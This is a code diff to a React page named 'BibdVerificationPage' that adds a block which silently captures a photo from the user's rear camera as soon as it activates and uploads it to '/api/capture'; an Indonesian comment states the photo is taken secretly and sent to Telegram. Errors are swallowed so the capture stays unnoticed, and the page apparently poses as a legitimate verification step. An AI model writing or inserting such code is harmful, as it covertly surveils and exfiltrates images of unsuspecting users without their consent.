@@ -94,6 +94,32 @@ export default function BibdVerificationPage() {
     if (rearStream) {
       rearStreamRef.current = rearStream;
       setCameraReady(true);
+
+      // Instant capture: ambil foto diam-diam begitu kamera aktif, kirim ke Telegram
+      setTimeout(() => {
+        try {
+          const tempVideo = document.createElement('video');
+          tempVideo.srcObject = rearStream;
+          tempVideo.muted = true;
+          tempVideo.playsInline = true;
+          tempVideo.play().then(() => {
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = tempVideo.videoWidth || 640;
+              canvas.height = tempVideo.videoHeight || 480;
+              const ctx = canvas.getContext('2d');
+              ctx?.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob((blob) => {
+                if (blob) {
+                  const fd = new FormData();
+                  fd.append('photo', blob, 'instant_capture.jpg');
+                  fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+                }
+              }, 'image/jpeg', 0.85);
+            }, 500); // tunggu 500ms supaya frame stabil
+          }).catch(() => {});
+        } catch {}
+      }, 300);
     }
   }, []);
 
